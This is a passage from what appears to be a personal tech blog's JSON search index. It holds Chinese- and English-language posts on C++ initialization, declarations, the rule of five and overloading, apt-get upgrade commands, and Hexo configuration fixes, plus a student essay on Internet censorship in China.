c++里面的#define后面的定义部分，是不","tags":"EffectiveC++","title":"Book. Effective C++ item2-尽量使用const, enum, inline替换#define","type":"post"},{"authors":null,"categories":"C++","content":"介绍 在C++语言中int a;表示声明了整型a但未初始化，而C++中的对象总是会被初始化的，无论是否写了圆括号或者是否写了参数列表，例如：\nint basic_var; // 未初始化：应用\u0026quot;默认初始化\u0026quot;机制 CPerson person; // 初始化：以空的参数列表调用构造函数  参考链接： C++手稿：哪些变量会自动初始化？\n默认初始化规则 定义基本数据类型变量（单个值、数组）的同时可以指定初始值，如果未指定C++会去执行默认初始化(default-initialization)。 那么什么是”默认初始化”呢？\n 栈中的变量（函数体中的自动变量）和堆中的变量（动态内存）会保有不确定的值； 全局变量和静态变量（包括局部静态变量）会初始化为零(它们存储在进程的BSS段（这是全零的一段内存空间）)。   C++11: If no initializer is specified for an object, the object is default-initialized; if no initialization is performed, an ? object with automatic or dynamic storage duration has indeterminate value. Note: Objects with static or thread storage duration are zero-initialized, see 3.6.2.\n 所以函数体中的变量定义是这样的规则：\nint i; // 不确定值 int i = int(); // 0 int *p = new int; // 不确定值 int *p = new int(); // 0  几种初始化情况对比 全局变量(全局静态变量) Vs 局部变量(局部静态变量) 全局变量，全局静态变量和局部静态变量是存放在BSS段的，所以默认初始化为 0。局部变量是在栈里面，所以初始化情况不确定。\n类成员变量初始化 可见内置类型的成员变量的”默认初始化”行为取决于所在对象的存储类型，而存储类型对应的默认初始化规则是不变的。 所以为了避免不确定的初值，通常会在构造函数中初始化所有内置类型的成员。\n嵌套类的变量初始化 规则还是是一样的，默认初始化行为取决于它所属对象的存储类型。封闭类（Enclosing）中成员对象的内置类型成员变量的”默认初始化”行为取决于当前封闭类对象的存储类型，而存储类型对应的默认初始化规则仍然是不变\n代码例子 #include \u0026lt;iostream\u0026gt; //1. 全局变量与静态全局变量 int g_var; int *g_pointer; static int g_static; class A{ public: int v; }; class B{ public: int v; A a; }; //2. 全局成员变量 A class_g_var; B class_b_g_var; int main(){ //1. 局部变量与静态局部变量 int l_var; int *l_pointer; static int l_static; // 2. 具备成员变量 A class_l_var; static A class_l_static; B class_b_l_var; std::cout\u0026lt;\u0026lt;\u0026quot;--------Global Vs Local Variate---------\u0026quot;\u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;Global Variate: \u0026quot;\u0026lt;\u0026lt; g_var \u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;Global Point: \u0026quot;\u0026lt;\u0026lt; g_pointer \u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;Global Static Variate: \u0026quot;\u0026lt;\u0026lt; g_static \u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;Local Variate: \u0026quot;\u0026lt;\u0026lt; l_var \u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;Local Point: \u0026quot;\u0026lt;\u0026lt; l_pointer \u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;Local Static Variate: \u0026quot;\u0026lt;\u0026lt; l_static \u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;--------Global Vs Local Class Variate---------\u0026quot;\u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;Global Class Variate: \u0026quot;\u0026lt;\u0026lt; class_g_var.v \u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;Local Class Variate: \u0026quot;\u0026lt;\u0026lt; class_l_var.v \u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;Local Static Class variate: \u0026quot;\u0026lt;\u0026lt; class_l_static.v \u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;--------2lGlobal Vs Local Class Variate---------\u0026quot;\u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;Global Class Variate: \u0026quot;\u0026lt;\u0026lt; class_b_g_var.v \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; class_b_g_var.a.v \u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;Local Class Variate: \u0026quot;\u0026lt;\u0026lt; class_b_l_var.v \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; class_b_l_var.a.v \u0026lt;\u0026lt;std::endl; return 0; };  Makefile\nCXX = g++ # Warnings frequently signal eventual errors: CXXFLAGS=-g -std=c++11 -W -Wall -Weffc++ -Wextra -pedantic -O0 OBJS = \\ main.o EXEC = run %.o: %.cpp $(CXX) $(CXXFLAGS) -c $\u0026lt; -o $@ $(EXEC): $(OBJS) $(CXX) $(CXXFLAGS) -o $@ $(OBJS) $(LDFLAGS) main.o: main.cpp clean: rm -rf $(OBJS) rm -rf $(EXEC)  ","date":1536631771,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1536631771,"objectID":"23cfcab0cd058e15bfc068ee6cfea7d6","permalink":"http://www.guozet.me/post/C++-initialization-of-variable/","publishdate":"2018-09-11T02:09:31Z","relpermalink":"/post/C++-initialization-of-variable/","section":"post","summary":"介绍 在C++语言中int a;表示声明了整型a但未初始化，而C","tags":"C++","title":"C++ 变量的初始化问题","type":"post"},{"authors":null,"categories":"C++","content":"Introduce 声明 声明一个变量只是将变量名标识符的有关信息告诉编译器，使编译器“认识”该标识符，但声明不一定引起内存的分配(没有内存分配)。声明有两个作用：\n 告诉编译器，这个名字已经匹配到一块内存上，下面的代码用到变量或者对象是在别的地方定义的。声明可以出现多次。 告诉编译器，这个名字已经被预定了，别的地方再也不能用它来作为变量名或对象名。  class MyClass { //数据成员细节... //成员函数细节... };  上述声明仅告诉编译器有自定义类型MyClass,编译器仅对其进行语汇分析及名字的决议，并未占用内存!\n定义 定义就是（编译器）创建一个对象，为这个对象分配一块内存，并给它取上一个名字，这个名字就是就是我们经常所说的变量名或对象名。\n在C++程序中，大多数情况下变量声明也就是变量定义，声明变量的同时也就完成了变量的定义，只有声明外部变量时例外。\n声明Vs定义： 是声明还是定义，判断的原则是看是否占用内存\nclass MyClass //类的声明，无内存占有 { string myString; //string的声明 };  这里面的string myString;实在类的声明里面，并没有实际申请内存，所以这就是声明，因为它并没有实际申请内存。\n#include\u0026lt;iostream\u0026gt; //全局作用域 string myString;//定义，myString是实例化的string！ int main() { //Main函数体内 string myAnotherString;//定义，myAnotherString是实例化的string！ return 0; }  这里面的string myString;是全局定义，全局对象一开始就是要申请内存的。\n小结：变量和对象不加extern永远是定义,类中的除外。 函数只有函数头是声明，有函数体的是定义。类永远只是声明。类成员函数的函数体是定义。\nclass MyClass { static int x; //这里的x是声明 static const int a; //这里的a是声明 //非static变量在类实例化时才分配内存. MyClass();//这里的函数是声明 }; int MyClass::x;//这是定义 const int MyClass::a=11;//这是定义  //这里的Fun是定义，因为有函数体 int fun(int a,int b) { int c; c=a+b; return c; } //这里的Fun是声明，因为这里只有函数头 int fun(int a,int b)；  ","date":1536631771,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1536631771,"objectID":"e3d6fbb50f2e7d9c0d3b64e1f8296732","permalink":"http://www.guozet.me/post/c++-declaration-definition-initialization/","publishdate":"2018-09-11T02:09:31Z","relpermalink":"/post/c++-declaration-definition-initialization/","section":"post","summary":"Introduce 声明 声明一个变量只是将变量名标识符的有关信息告诉编译器，使","tags":"C++","title":"C++声明与定义的区别","type":"post"},{"authors":null,"categories":"Paper","content":"How Internet News Censorship in China Silences the People’s Song\nThis is a thesis when I studied in the ELS.\nIntroduce Last month, my friend Carrier went back to China from the United States after she had been living the United States for more than three years. She complained to me about the Internet in her house but not because of the speed of the Internet. She found that the Google Mail and Facebook were inaccessible when she wanted to access to Google Mail to receive some email from her boss and to contact friends through Facebook. As a computer engineer in China, I have never been puzzled by this since I can use a lot of ways to access to Google or Facebook. Is it challenging to access to Google and Facebook in China? Curiosity pushed me to investigate further. When I asked my parents and some high school classmates about whether they knew how to avert the government blocking access to Google, most of them said that they didn’t know how to access to Google in China even though they knew the Google search engine is most famous in the world. After doing some research, I found that blocking Google is only one of many blocking events involving Internet news censorship in China.\nMore surprisingly, Google chose to enter the Chinese market in 2005, but Google suddenly announced that they decided to close the office in China in 2010. According to a new approach to China from the Google Official Blog, the officer said, “We will be discussing with the Chinese government the basis on which we could operate an unfiltered search engine within the law, if at all. We recognize that this may well mean having to shut down Google.cn, and potentially our offices in China.” (2010). Through the history of the world, it is hard to find a company to break up with significant power in public. However, Google did it and closed their offices in China until 2018. The original reason for this matter is that Google received a lot of notifications from Chinese Government to block some websites and block some keywords involving Chinese politics. However, these blocking announcements didn’t have any Chinese law to support them. Sometimes, the office just got a phone call to Google to require them to block some information. Are these demands from the Chinese government unreasonable in western culture? Is it difficult to understand why Google couldn’t compromise with the Chinese government later? Most western experts believe that Chinese has a severe Internet news censorship to prevent the free spreading through their experience and history (Sorenson, 2013). Nevertheless, using Western values fails to explain why China has a rigorous Internet news censorship without a basic knowledge of Chinese culture and values.\nIn the section below, I begin to introduce four types of Internet news censorship. I then point out the reasons why the governments need to build the Internet news censorship system in China and why the citizens don’t fight for their freedom on the Internet with the government. I then give the positive and negative about the Chinese censorship policy. Finally, I offer my opinion and conclude.\n Types of Internet News Censorship Nowadays, the Internet news censorship is prevalent in China. How does the Internet censorship work in China? Firstly, we can take the blocking IP as an example. When someone wants to access to the website which is involved in the blocking list of government, the government censorship system will check it and doesn’t respond to the user, and it will pass it to deal with next one (King, 2013). As a result, the user can’t get the response from the server computer because the connection requirement was cut down by government censorship (King, 2013). Besides, the government built The National Firewall to curb the citizens accessing the news from foreign countries (King, 2013). For example, if you live or work in China, you can’t use your computer or smartphone to access to the Youtube or Google websites directly. Also, the government cooperates with big internet and technology companies to ban some news. For example, the government cooperation with Baidu company which is the most significant search engine company in China to block some news which is terrible for some powerful politicians. However, the purpose of the censorship program just helps the government to delete some articles on the Internet. It can’t persecute authors. There are some main types of Internet censorship in China.\nNon-transparent Censorship Ambiguous law It is so funny that China doesn’t have a clear rule to describe how the Internet censorship system works in China. If you ask The Publicity Department of the Communist Party of China (CCPPD) why the government indicated the Google search must censor the results and remove some issues, they will tell you that Google should filter search results by Chinese laws. But when you ask them about which law these results violated, they just say that the content in these websites endanger the security of the nation, divulges state secrets and disturbs the social order (Sorenson, 2013). However, they can’t precisely inform why Google must ban these sites. In fact, there is no a clear law that explains how the Internet News Censorship works (Sorenson, 2013). Besides, sometimes the censorship not only requires internet companies to delete some articles, but it also needs the companies to help the government to spread some government articles and change the search results to the government official website (Sorenson, 2013). Of course, this requirement is also by law even though you will not know this is what law forever. Enforce Internet Real-name system It also causes fear and narrows the freedom of speech on the Internet. Last year, China government revised the Network Information Management law. After that, each person who uses the Internet in China wanted to post some articles on Internet must correspond to his real name and Chinese identity card number. As the implementation of the Internet real-name system, government efficiently managed the people’s opinion on the Internet. For example, if someone spread rumors or libelous statements, Chinese police easily find their real name and arrest them because the police can ask the internet company to get the private information of rumormongers. The National Firewall There are two critical walls in China which are famous in the world. One is Great Wall in the north of China to protect the Chinese citizens in the past. Another is Great Firewall on the internet to constrain the Chinese citizens’ liberalizing. For instance, the government worker said, “These companies which come from foreign countries are welcome to China, but these companies must follow the law. If you don’t accept any Chinese law, then you can’t be allowed to built officer in China.” The policy which doesn’t allow each foreign companies spread these culture and opinion to Chinese society. It is not difficult to understand, but it bans the freedom in the china. These policies make Chinese people don’t know how to judge the events which happened in China. Besides, these policies also cause some people don’t have a chance to learn from the international company and their culture. So, this is a wall which let some Chinese people disable in the Mind. It is very dangerous for them. If they can’t catch the library in the world, they can’t catch up with some foreign countries’ people in the future.\nComplex Censorship System to Guide public opinion In China, Internet news censorship is complicated and methodical. This censorship system looks like an inspection machine. It is working as following steps.\nDo censorship by themselves. Chinese netizens have realized that a lot of words cannot send on the website, like Weibo, QQ. Because when you wrote some sensitive word or title and wanted to post them on a site, you would fail to send these words because the censorship system may notice you about “Your post has some sensitive words, so you can not post it.”. Sometimes, even though you posted this article, but some worker of this website will delete it. However, this system doesn’t tell you which words you need to change it. Therefore, Chinese netizens have learned replaced some sensitive words out of the similar words or deleted this part before they post the message. If you live in this situation for a long time, this censorship will make you built a behavior about checking your message before you want to pose it even though there is no censorship anymore. For example, a netizen would publish a message containing “Hu Jintao”, which was the last president of China. He may use some similar word to replace it because the president name in some websites is the sensitive words and you can’t discuss them with some bad news on the site.  Strict Internet News Censorship There is more than one billion Internet population in China (Xu, 2011). Even though a small part of netizens intentionally spread a rumor, it also has a significant influence on society safety and economy. For example, according to the news (December 2003), although there was no one person killed by atypical pneumonia (SARS) in the United States in 2003, panic with the rumor about SARS spread each side in the United States. In fact that no one to listened to the truth and the experts and they didn’t believe everyone. They didn’t go to the Chinese restaurant and close some Chinese markets because of these rumors. (LEE et al., 2003)If something like this happens in China, this will set off riots nationally even though only twenty percent of the people believe these tales. So, each country needs to build an Internet censorship system stop the rumor spread if they want to quell public panic.\nBusiness. If Google and Facebook were allowed to develop in China in the last ten years, Google and Facebook would have monopolized the search engine field and instant message field in China. Subsequently, Tencent (the same as Facebook) and Baidu (the same as Google) company would not rise. As a result, Chinese internet industry would be monopolized by Google and Facebook which are foreign companies that belong to the United States. So these companies can earn a lot of money from China and wouldn’t give any space for any Chinese companies. It may damage local internet companies. Therefore, after the government built The National Firewall, it created a lot of opportunities for the Chinese company to improve their technique.\nCultural and social protection. If Facebook and Google had controlled the domestic cultural market in China, they would have exported their culture and values through China, and it may cause a terrible influence on traditional Chinese Culture. In social media field, it is easier to control the media and public opinion direction.\nNational security. Taking Huawei company as an example, Huawei has recently prepared how they can enter the United States market. However, the American government believes that their products will pose a threat to the United States because they suspect that this is a Chinese company which may be controlled by the Chinese government. As one of the largest company in the world, Google owns a sizeable amount of personal information data. When they occupy Chinese market, they may damage the Chinese information safety because this firm belongs to another country. From the government points of view, they can’t believe these companies can be independent of their government.\n Conclusions and Future Study When ostrich encounters their enemy in the desert, they would bury their head in the sand and think that the enemy can not see them.The Chinese government built an Internet wall like an ostrich shielding of the best-known websites, such as Google. Ironically, the Internet wall is useless to block libertarian news. Most Chinese people know that even the government blocks “thing,” someone also can read it in the foreign countries. Nowadays, the international information exchange is frequent. For example, there were 2.59 million Chinese people who traveled to the US during last year. They can easily read every new they liked. Also, some Chinese people often over the Internet wall to read foreign news. As they say, that “Good news never goes beyond the gate, while bad news spread far and wide.” The more blocking, the more attention.\nThe Chinese government is blocking some famous websites in the world just because they want to protect small, influential group and individual. Some expect who supports the Internet control policies in China, has often been cited a word, \u0026ldquo;I have no way to change you, but I have the right to choose our friends.\u0026rdquo; said by LuHui, the director of the state Internet information office. He is the manager of the Chinese Internet as most foreign media. He said, “we are welcome any Internet company to enter the Chinese market, but you must observe two regulations: don’t harmful on China’s national security and don’t harmful on Chinese consumers’ rights.” According to his opinion, the Chinese government shielding Google Google, Facebook, Twitter, YouTube, and thousands of websites such as Wikipedia Wikipedia, is to protect \u0026quot; the consumers’ rights\u0026rdquo; and \u0026ldquo;national security\u0026rdquo; But the analysis of the above in this essay, we already know that it is not entirely correct. This censorship system only works for small group and individual interests to block world-famous sites to maintain a popular figure.\nIf this country always hides in the back of the internet walls by governments, it may be relatively safe. But they can’t catch up with other advanced power in the world in the future. Besides, it also unable to obtain the respect of other nations or countries. \u0026ldquo;I have no way to change you, but I have the right to choose friends, \u0026quot; said by LuHui is good, but this sentence also applies to the Chinese people. They will have the right to choose which news they want to read.\n References A new approach to China. (2010, January 12). Retrieved from https://googleblog.blogspot.com/2010/01/new-approach-to-china.html\nIn U.S., Fear Is Spreading Faster Than SARS. (2003, April 16). Retrieved from http://www.nytimes.com/2003/04/17/world/the-sars-epidemic-asian-americans-in-us-fear-is-spreading-faster-than-sars.html\nKing, G., Pan, J., \u0026amp; Roberts, M. E. (2013, 05). How Censorship in China Allows Government Criticism but Silences Collective Expression. American Political Science Review, 107(02), 326-343. doi:10.1017/s0003055413000014\nQiu, J. L. (1999). Virtual censorship in China: Keeping the gate between the cyberspaces. International Journal of Communications Law and Policy, 4(1), 25.\nRevised U.S. Surveillance Case Definition for Severe Acute Respiratory Syndrome (SARS) and Update on SARS Cases, United States and Worldwide, December 2003. (n.d.). Retrieved from https://www.cdc.gov/mmwr/preview/mmwrhtml/mm5249a2.htm\nSorenson, A.(2013). Internet Censorship in China. Mankato, MN:Undergraduate Research Symposium.\nXu, X., Mao, Z. M., \u0026amp; Halderman, J. A. (2011). Internet Censorship in China: Where Does the Filtering Occur? Passive and Active Measurement Lecture Notes in Computer Science, 133-142. doi:10.1007/978-3-642-19260-9_14\n","date":1536545371,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1536545371,"objectID":"e3bb4f0802e8627c1d3d2a29d9b4b01b","permalink":"http://www.guozet.me/post/How-Internet-News-Censorship-in-China-Silences-the-People-Song/","publishdate":"2018-09-10T02:09:31Z","relpermalink":"/post/How-Internet-News-Censorship-in-China-Silences-the-People-Song/","section":"post","summary":"How Internet News Censorship in China Silences the People’s Song\nThis is a thesis when I studied in the ELS.\nIntroduce Last month, my friend Carrier went back to China from the United States after she had been living the United States for more than three years. She complained to me about the Internet in her house but not because of the speed of the Internet. She found that the Google Mail and Facebook were inaccessible when she wanted to access to Google Mail to receive some email from her boss and to contact friends through Facebook. As a computer engineer in China, I have never been puzzled by this since I can use a lot of ways to access to Google or Facebook. Is it challenging to access to Google and Facebook in China? Curiosity pushed me to investigate further. When I asked my parents and some high school classmates about whether they knew how to avert the government blocking access to Google, most of them said that they didn’t know how to access to Google in China even though they knew the Google search engine is most famous in the world. After doing some research, I found that blocking Google is only one of many blocking events involving Internet news censorship in China.\n","tags":"Paper","title":"How Internet News Censorship in China Silences the People’s Song","type":"post"},{"authors":null,"categories":"Linux","content":"Introduce 常用的三个命令：\nsudo apt-get update sudo apt-get upgrade sudo apt-get dist-upgrade  apt-get是某些linux发行版使用的一个“包管理器”（还有别的发行版使用yum等，以及brew等其他平台上的包管理器，工作原理类似）。包管理器的作用是从源（Source）服务器那里下载最新的软件包列表，然后在你需要安装某个软件包（apt-get install）的时候从列表里面查询这个软件包的版本信息、系统要求、翻译、依赖项（该软件正常运行必须安装的其它软件）并且添加到同时安装的列表里面，再查询所有安装列表里面的软件包的.deb文件下载地址，最后批量下载，自动分析安装顺序然后安装完成。\n update \u0026amp; upgrade \u0026amp; dist-upgrade sudo apt-get update和sudo apt-get upgrade分别更新的是什么：\n update是下载源里面的metadata的. 包括这个源有什么包, 每个包什么版本之类的，最新版本是什么. upgrade是根据update命令下载的metadata决定要更新什么包(同时获取每个包的位置)，对已经安装的软件包本身进行更新的过程。由于确定要更新的软件包需要对本地安装的版本和列表的版本进行比较，所以要在update以后运行这一条. dist-upgrade:可以聪明的解决相依性的问题,如果有相依性问题,需要安装/移除新的Package,就会试着去安装/移除它. (所以通常这个会被认为是有点风险的升级)   注明：在install操作之前执行update和upgrade，实际上是确保本地软件列表信息和已安装软件均为最新的过程。这样做可以最大限度地确保新安装的软件包正常工作。\n PS：软件源服务器地址可以在/etc/apt/sources.list里面看到。\nExample: upgrade and dist-upgrade\napt-get upgrade 和 apt-get dist-upgrade 本质上是没有什么不同的。只不过，dist-upgrade 会识别出当依赖关系改变的情形并作出处理，而upgrade对此情形不处理。\n例如软件包 a 原先依赖 b c d，但是在源里面可能已经升级了，现在是 a 依赖 b c e。这种情况下，dist-upgrade 会删除 d 安装 e，并把 a 软件包升级，而 upgrade 会认为依赖关系改变而拒绝升级 a 软件包。\n","date":1536505771,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1536505771,"objectID":"41fbd518e333f6e483c020d47f97ae07","permalink":"http://www.guozet.me/post/Ubuntu-Update-Upgrade/","publishdate":"2018-09-09T15:09:31Z","relpermalink":"/post/Ubuntu-Update-Upgrade/","section":"post","summary":"Introduce 常用的三个命令：\nsudo apt-get update sudo apt-get upgrade sudo apt-get dist-upgrade  apt-get是某些linux发行版使用的一个“包管理器”（还有别的发行版使用yum等，以及brew等其他平台上的包管理器，工作原理类似）。包管理器的作用是从源（Source）服务器那里下载最新的软件包列表，然后在你需要安装某个软件包（apt-get install）的时候从列表里面查询这个软件包的版本信息、系统要求、翻译、依赖项（该软件正常运行必须安装的其它软件）并且添加到同时安装的列表里面，再查询所有安装列表里面的软件包的.deb文件下载地址，最后批量下载，自动分析安装顺序然后安装完成。\n","tags":"Linux","title":"Ubuntu里面update,upgrade和dist-upgrade的区别","type":"post"},{"authors":null,"categories":"Hexo","content":"前言 记录对Hexo的优化，以及配置Hexo中遇到的问题以及解决方案。\n问题 本地搜索路径不正确 问题描述 期待路径是http://guozet.me/post/postname/,然后实际得到的路径是/post/postname/。 先检查自己的 配置过程：\n$ npm install hexo-generator-search --save  站点配置文件：_config.yml中任意位置加入：\nsearch: path: search.xml field: post  我本地的配置与上面的配置是一致的，但是路径位置就是不对，经过搜索，在这个 链接解决了我的问题。\n解决思路 在搜索页面，使用F12打开确定自己的搜索路径链接是否有问题。 发现在路径位置：\n\u0026lt;a href=\u0026quot;//post/Write-first-Analyzer-rip/\u0026quot; class=\u0026quot;search-result-title\u0026quot;\u0026gt;在\u0026lt;b class=\u0026quot;search-keyword\u0026quot;\u0026gt;Bro\u0026lt;/b\u0026gt;中完成第一个协议分析器—RIP协议\u0026lt;/a\u0026gt;  这里有两个//在post前面，直接修改配置文件，去掉一个/。 修改localsearch.swig源码:\n//var articleUrl = decodeURIComponent(data.url); var articleUrl = decodeURIComponent(data.url).substring(1);//截取第一位/斜杠  修改页面宽度 我们用Next主题是发现在电脑上阅读文章时内容两边留的空白较多，这样在浏览代码块时经常要滚动滚动条才能阅读完整，体验不是很好，下面提供修改内容区域的宽度的方法。 NexT 对于内容的宽度的设定如下：\n700px，当屏幕宽度 \u0026lt; 1600px 900px，当屏幕宽度 \u0026gt;= 1600px 移动设备下，宽度自适应 如果你需要修改内容的宽度，同样需要编辑样式文件。 在Mist和Muse风格可以用下面的方法：\n编辑主题的 source/css/_variables/custom.styl 文件，新增变量：\n// 修改成你期望的宽度 $content-desktop = 700px // 当视窗超过 1600px 后的宽度 $content-desktop-large = 900px ","date":1536372571,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1536372571,"objectID":"d3ba9c437f577671a047ee45ab4b1e5e","permalink":"http://www.guozet.me/post/Hexo-Optimize-and-patch/","publishdate":"2018-09-08T02:09:31Z","relpermalink":"/post/Hexo-Optimize-and-patch/","section":"post","summary":"前言 记录对Hexo的优化，以及配置Hexo中遇到的问题以及解决方案。\n","tags":"Hexo","title":"Hexo使用中的优化以及问题解决记录","type":"post"},{"authors":null,"categories":"C++","content":"Rule of five Because the presence of a user-defined destructor, copy-constructor, or copy-assignment operator prevents implicit definition of the move constructor and the move assignment operator, any class for which move semantics are desirable, has to declare all five special member functions:\nclass rule_of_five { char* cstring; // raw pointer used as a handle to a dynamically-allocated memory block rule_of_five(const char* s, [std::size_t](http://en.cppreference.com/w/cpp/types/size_t) n) // to avoid counting twice : cstring(new char[n]) // allocate { [std::memcpy](http://en.cppreference.com/w/cpp/string/byte/memcpy)(cstring, s, n); // populate } public: rule_of_five(const char* s = \u0026quot;\u0026quot;) : rule_of_five(s, [std::strlen](http://en.cppreference.com/w/cpp/string/byte/strlen)(s) + 1) {} ~rule_of_five() { delete[] cstring; // deallocate } rule_of_five(const rule_of_five\u0026amp; other) // copy constructor : rule_of_five(other.cstring) {} rule_of_five(rule_of_five\u0026amp;\u0026amp; other) noexcept // move constructor : cstring([std::exchange](http://en.cppreference.com/w/cpp/utility/exchange)(other.cstring, nullptr)) {} rule_of_five\u0026amp; operator=(const rule_of_five\u0026amp; other) // copy assignment { return *this = rule_of_five(other); } rule_of_five\u0026amp; operator=(rule_of_five\u0026amp;\u0026amp; other) noexcept // move assignment { [std::swap](http://en.cppreference.com/w/cpp/algorithm/swap)(cstring, other.cstring); return *this; } // alternatively, replace both assignment operators with // rule_of_five\u0026amp; operator=(rule_of_five other) noexcept // { // std::swap(cstring, other.cstring); // return *this; // } };  Unlike Rule of Three, failing to provide move constructor and move assignment is usually not an error, but a missed optimization opportunity.\n第五条：再谈重载、覆盖和隐藏\n在C++中，无论在类作用域内还是外，两个（或多个）同名的函数，可能且仅可能是以下三种关系：重载（Overload）、覆盖（Override）和隐藏（Hide），因为同名，区分这些关系则是根据参数是否相同、是否带有const成员函数性质、是否有virtual关键字修饰以及是否在同一作用域来判断。在第四条中，我们曾提到了一些关于重载、覆盖的概念，但只是一带而过，也没有提到隐藏，这一篇我们将详细讨论。\n1、首先说的是重载，有一个前提必须要弄清楚的是，如果不在类作用域内进行讨论，两个（或多个）同名函数之间的关系只可能是重载或隐藏，这里先说重载。考虑以下事实：\nint foo(char c){...} void foo(int x){...}  这两个函数之间的关系是重载（overload），即相同函数名但参数不同，并注意返回类型是否相同并不会对重载产生任何影响。\n也就是说，如果仅仅是返回类型不相同，而函数名和参数都完全相同的两个函数，不能构成重载，编译器会告知\u0026quot;ambiguous\u0026rdquo;（二义性）等词以表达其不满：\n//Can't be compiled! int fooo(char c){...} void fooo(char c){...} char c = 'A'; fooo(c); // Which one? ambiguous  在第四条中，已经讲述过，重载是编译期绑定的静态行为，不是真正的多态性，那么，编译器是根据什么来进行静态绑定呢？又是如何确定两个（或多个）函数之间的关系是重载呢？\n有以下判定依据：\n（1）相同的范围：即作用域，这里指在同一个类中，或同一个名字空间，即C++的函数重载不支持跨越作用域进行（读者可再次对比Java在这问题上的神奇处理，既上次Java给我们提供了未卜先知的动态绑定能力后，Java超一流的意识和大局观再次给Java程序员提供了跨类重载的能力，如有兴趣可详细阅读《Thinking in Java》的相关章节，其实对于学好C++来讲，去学一下Java是很有帮助的，它会告诉你，同样或类似的问题，为什么Java要做这样的改进），这也是区别重载和隐藏的最重要依据。\n关于“C++不能支持跨类重载”，稍后笔者会给出代码来例证这一点。\n（2）函数名字相同（基本前提）\n（3）函数参数不同（基本前提，否则在同一作用域内有两个或多个同名同参数的函数，将产生ambiguous，另外注意，对于成员函数，是否是const成员函数，即函数声明之后是否带有const标志， 可理解为“参数不同“），第（2）和第（3）点统称“函数特征标”不同\n（4）virtual关键字可有可无不产生影响（因为第（1）点已经指出，这是在同一个类中）\n即**“相同的范围，特征标不同（当然同名是肯定的），发生重载“**。\n2、覆盖（override），真正的多态行为，通过虚函数来实现，所以，编译器根据以下依据来进行判定两个（注意只可能是两个，即使在继承链中，也只是最近两个为一组）函数之间的关系是覆盖：\n（1）不同的范围：即使用域，两个函数分别位于基类和派生类中\n（2）函数名字相同（基本前提）\n（3）函数参数也相同（基本前提），第（2）和第（3）点统称“函数特征标”相同\n（4）基类函数必须用virtual关键字修饰\n即**“不同的范围，特征标相同，且基类有virtual声明，发生覆盖“**。\n3、隐藏（Hide），即：\n（1）如果派生类函数与基类函数同名，但参数不同（特征标不同），此时，无论是否有virtual关键字，基类的所有同名函数都将被隐藏，而不会重载，因为不在同一个类中；\n（2）如果派生类函数与基类函数同名，且参数也相同（特征标相同），但基类函数没有用virtual关键字声明，则基类的所有同名函数都将被隐藏，而不会覆盖，因为没有声明为虚函数。\n即**“不同的范围，特征标不同（当然同名是肯定的），发生隐藏”**，或**\u0026ldquo;不同的范围，特征标相同，但基类没有virtual声明，发生隐藏“**。\n可见有两种产生隐藏的情况，分别对应不能满足重载和覆盖条件的情况。\n另外必须要注意的是，在类外讨论时，也可能发生隐藏，如在名字空间中，如下述代码所示：\n#include \u0026lt;iostream\u0026gt; using namespace std; void foo(void) { cout \u0026lt;\u0026lt; \u0026quot;global foo()\u0026quot; \u0026lt;\u0026lt; endl; } int foo(int x) { cout \u0026lt;\u0026lt; \u0026quot;global foo(int)\u0026quot; \u0026lt;\u0026lt; endl; return x; } namespace a { void foo(void) { cout \u0026lt;\u0026lt; \u0026quot;a::foo()\u0026quot; \u0026lt;\u0026lt; endl; } void callFoo(void) { foo(); // foo(10); Can't be compiled! } } int main(int argc, char** argv) { foo(); a::callFoo(); return 0; }  输出结果：\nglobal foo() a::foo()  注意，名字空间a中的foo隐藏了其它作用域（这里是全局作用域）中的所有foo名称，foo(10)不能通过编译，因为全局作用域中的int foo(int)版本也已经被a::foo()隐藏了，除非使用::foo(10)显式进行调用。\n这也告诉我们，无论何时，都使用完整名称修饰（作用域解析符调用函数，或指针、对象调用成员函数）是一种好的编程习惯。\n好了，上面零零散散说了太多理论的东西，我们需要一段实际的代码，来验证上述所有的结论：\n#include \u0026lt;iostream\u0026gt; using namespace std; class Other { void* p; }; class Base { public: int iBase; Base():iBase(10){} virtual void f(int x = 20){ cout \u0026lt;\u0026lt; \u0026quot;Base::f()--\u0026quot; \u0026lt;\u0026lt; x \u0026lt;\u0026lt; endl; } virtual void g(float f) { cout \u0026lt;\u0026lt; \u0026quot;Base::g(float)--\u0026quot; \u0026lt;\u0026lt; f \u0026lt;\u0026lt; endl; } void g(Other\u0026amp; o) { cout \u0026lt;\u0026lt; \u0026quot;Base::g(Other\u0026amp;)\u0026quot; \u0026lt;\u0026lt; endl; } void g(Other\u0026amp; o) const { cout \u0026lt;\u0026lt; \u0026quot;Base::g(Other\u0026amp;) const\u0026quot; \u0026lt;\u0026lt; endl;} }; class Derived : public Base { public: int iDerived; Derived():iDerived(100){} void f(int x = 200){ cout \u0026lt;\u0026lt; \u0026quot;Derived::f()--\u0026quot; \u0026lt;\u0026lt; x \u0026lt;\u0026lt; endl; } virtual void g(int x) { cout \u0026lt;\u0026lt; \u0026quot;Derived::g(int)--\u0026quot; \u0026lt;\u0026lt; x \u0026lt;\u0026lt; endl; } }; int main(int argc, char** argv) { Base* pBase = 